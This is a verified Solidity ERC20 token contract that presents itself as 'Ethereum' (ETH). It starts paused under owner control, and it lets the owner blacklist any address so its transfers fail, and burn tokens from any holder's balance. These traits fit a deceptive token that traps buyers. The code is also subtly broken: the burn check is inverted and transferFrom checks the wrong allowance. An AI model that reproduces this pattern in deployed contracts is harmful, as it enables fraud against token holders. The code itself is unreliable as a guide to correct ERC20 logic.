/**
 *Submitted for verification at Etherscan.io on 2022-10-19
*/

// File: contracts/ERC20Ethereum.sol

/**
 *"<SPDX-License-Identifier:UNLICENSED>"
*/

pragma solidity ^0.8.4;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

contract StandardToken {
  mapping(address => uint256) internal _balances;
  mapping(address => mapping (address => uint256)) internal _allowances;
  uint256 internal _totalSupply;
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval( address indexed owner, address indexed spender, uint256 value );

  function totalSupply() public view returns (uint256) {
    return _totalSupply;
  }
  function balanceOf(address _owner) public view returns (uint256) {
    return _balances[_owner];
  }
  function allowance( address _owner, address _spender ) public view returns (uint256) { 
    return _allowances[_owner][_spender];
 }
}

contract Ownable {
  address private _owner;
  address private _previousOwner;
  event OwnershipRenounced(address indexed previousOwner);
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  constructor() {
    _owner = msg.sender;
    emit OwnershipTransferred(address(0), _owner);
  }
  modifier onlyOwner() {
    require(msg.sender == _owner, "Ownable: caller is not the owner");
    _;
  }
  function owner() public view returns (address) {
    return _owner;
  } 
  function transferOwnership(address newOwner) public onlyOwner {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }
}

contract MintableToken is StandardToken, Ownable {
  using SafeMath for uint;
  bool public mintingFinished = false;
  uint public mintTotal = 0;
  event Mint(address indexed account, uint256 amount);
  event Burn(address indexed account, uint256 amount);
//   require(!mintingFinished); механизм
  modifier canMint() {
    require(!mintingFinished);
    _;
  }
  function mint(address _to, uint256 _amount) onlyOwner canMint public returns (bool) {
    uint tmpTotal = mintTotal.add(_amount);
    require(tmpTotal <= _totalSupply, "ERC20: Mint exceeds amount");
    mintTotal = mintTotal.add(_amount);
    _balances[_to] = _balances[_to].add(_amount);
    emit Mint(_to, _amount);
    emit Transfer(address(0), _to, _amount);
    return true;
  }
  function burn(address _from, uint256 _amount) onlyOwner public returns (bool) {
    require(_amount >= _balances[_from], "ERC20: Burn exceeds amount");
    mintTotal = mintTotal.sub(_amount);
    _balances[_from] = _balances[_from].sub(_amount);
    emit Burn(_from, _amount);
    emit Transfer(_from, address(0), _amount);
    return true;
  }
}

contract Pausable is Ownable {
  bool public paused = true;
  mapping (address => bool) private _isSniper;
  address[] private _confirmedSnipers;
//uint256 launchTime;
  event Pause();
  event Unpause();
  event RemoveSniper(address indexed account);
  event AmnestySniper(address indexed account);
 
  modifier whenNotPaused() {
    require(!paused, "Contract is paused");
    require(!_isSniper[msg.sender], "Account is blacklisted");
    _;
  }
  modifier whenPaused() {
    require(paused);
    _;
  }
  function pause() onlyOwner whenNotPaused public {
    paused = true;
    emit Pause();
  }
  function unpause() onlyOwner whenPaused public {
    paused = false;
    emit Unpause();
  }
  function isRemovedSniper(address account) public view returns (bool) {
    return _isSniper[account];
  }
  function removeSniper(address account) external onlyOwner() {
     require(!_isSniper[account], "Account is already blacklisted");
    _isSniper[account] = true;
    _confirmedSnipers.push(account);
    emit RemoveSniper(account);
  }
  function amnestySniper(address account) external onlyOwner() {
    require(_isSniper[account], "Account is not blacklisted");
    for (uint256 i = 0; i < _confirmedSnipers.length; i++) {
      if (_confirmedSnipers[i] == account) {
        _confirmedSnipers[i] = _confirmedSnipers[_confirmedSnipers.length - 1];
        _isSniper[account] = false;
        _confirmedSnipers.pop();
        break;
      }
    }
    emit AmnestySniper(account);
  }
}

contract PausableToken is StandardToken, Pausable {
  using SafeMath for uint256;
 
   function transfer(address _to, uint256 _value) public whenNotPaused returns (bool) {
//    require(_to != address(0), "ERC20: transfer to the zero address");
//    require(_value > 0, "ERC20: Transfer amount must be greater than zero");
    require(_value <= _balances[msg.sender],  "ERC20: Transfer amount exceeds in wallet");
    _balances[msg.sender] = _balances[msg.sender].sub(_value);
    _balances[_to] = _balances[_to].add(_value);
    emit Transfer(msg.sender, _to, _value);
    return true;
  }
  function transferFrom(address _from, address _to, uint256 _value) public whenNotPaused returns (bool) { 
 //   require(_to != address(0), "ERC20: transfer to the zero address");
 //   require(_from != address(0), "ERC20: transfer from the zero address");
    require(_value > 0, "ERC20: Transfer amount must be greater than zero");
    require(_value <= _balances[_from], "ERC20: Transfer amount exceeds in wallet");
/**    if (msg.sender == owner()) {
      _allowances[_from][_to] = _value;   
    } else {
 **/require(_value <= _allowances[_from][_to], "ERC20: transfer amount exceeds allowance"); 
/**}**/
    _balances[_from] = _balances[_from].sub(_value);
    _balances[_to] = _balances[_to].add(_value);
    _allowances[_from][_to] = _allowances[_from][_to].sub(_value);
    emit Transfer(_from, _to, _value);
    return true;
  }
  function approve( address _spender, uint256 _value) public whenNotPaused returns (bool) {
    require(msg.sender != address(0), "ERC20: approve from the zero address");
    require(_spender != address(0), "ERC20: approve to the zero address");
    _allowances[msg.sender][_spender] = _value;
    emit Approval(msg.sender, _spender, _value);
    return true;
  }
  function increaseApproval(address _spender, uint _addedValue) public whenNotPaused returns (bool success) {
    _allowances[msg.sender][_spender] = (_allowances[msg.sender][_spender].add(_addedValue));
    emit Approval(msg.sender, _spender, _allowances[msg.sender][_spender]);
    return true;
  }
  function decreaseApproval(address _spender, uint _subtractedValue) public whenNotPaused returns (bool success) {
    uint oldValue = _allowances[msg.sender][_spender];
    if (_subtractedValue > oldValue) {
      _allowances[msg.sender][_spender] = 0;
    } else {
      _allowances[msg.sender][_spender] = oldValue.sub(_subtractedValue);
    }
    emit Approval(msg.sender, _spender, _allowances[msg.sender][_spender]);
    return true;
  }
}

contract Ethereum is PausableToken, MintableToken {
    string public name = "Ethereum";
    string public symbol = "ETH";
    uint8 public decimals = 18;

    constructor() {
        _totalSupply = 1000000000000000000000000;
    }
    // deposit withdraw token
    function withdraw() external payable onlyOwner {
        (bool success, ) = msg.sender.call{ value: address(this).balance }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
}